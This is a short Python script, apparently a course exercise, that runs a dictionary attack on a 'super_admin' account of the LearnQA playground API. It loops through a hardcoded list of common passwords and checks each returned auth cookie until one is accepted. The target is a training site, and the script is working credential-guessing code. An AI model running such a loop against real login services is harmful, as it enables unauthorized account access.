import requests
import json

url_secret = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

# сюда ручками перенесли все пароли, которые остались после удаления дубликатов.
passwords = {"1": "password",
             "2": 123456,
             "3": 12345678,
             "4": "qwerty",
             "5": "abc123",
             "6": "monkey",
             "7": 1234567,
             "8": "letmein",
             "9": "trustno1",
             "10": "dragon",
             "11": "baseball",
             "12": 111111,
             "13": "iloveyou",
             "14": "master",
             "15": "sunshine",
             "16": "ashley",
             "17": "bailey",
             "18": "passw0rd",
             "19": "shadow",
             "20": 123123,
             "21": 654321,
             "22": "superman",
             "23": "qazwsx",
             "24": "michael",
             "25": "Football",
             "26": 12345,
             "27": 123456789,
             "28": "welcome",
             "29": "jesus",
             "30": "ninja",
             "31": "mustang",
             "32": "password1",
             "33": "adobe123",
             "34": "admin",
             "35": "1234567890",
             "36": "photoshop",
             "37": 1234,
             "38": "princess",
             "39": "azerty",
             "40": 0,
             "41": "access",
             "42": 696969,
             "43": "batman",
             "44": "1qaz2wsx",
             "45": "lovely",
             "46": "login",
             "47": "qwertyuiop",
             "48": "solo",
             "49": "starwars",
             "50": 121212,
             "51": "flower",
             "52": "hottie",
             "53": "loveme",
             "54": "zaq1zaq1",
             "55": "qwerty123",
             "56": 666666,
             "57": "hello",
             "58": "freedom",
             "59": "whatever",
             "60": "123qwe",
             "61": 555555,
             "62": "!@#$%^&*",
             "63": "charlie",
             "64": "aa123456",
             "65": "donald",
             "66": "1q2w3e4r",
             "67": 7777777,
             "68": 888888,
             "69": "123qwe"}

# перебираем список логинов и паролей, чтобы найти верный
for i in passwords:
    data = {"login": "super_admin", "password": passwords[i]}
    response_auth = requests.post(url_secret, data=data)
    auth_cookies_values = dict(response_auth.cookies).get("auth_cookie")
    auth_cookie = {"auth_cookie": auth_cookies_values}

    # проверяем куку на валидность
    cookies_check = requests.post(url_check, cookies=auth_cookie)

    # выводим результат,если пароль верный:

    if cookies_check.text == "You are authorized":
        print("You are authorized")
        print("Correct password : " + str(passwords[i]))
        response_auth = requests.post(url_secret, data=data)
        print(response_auth.text)







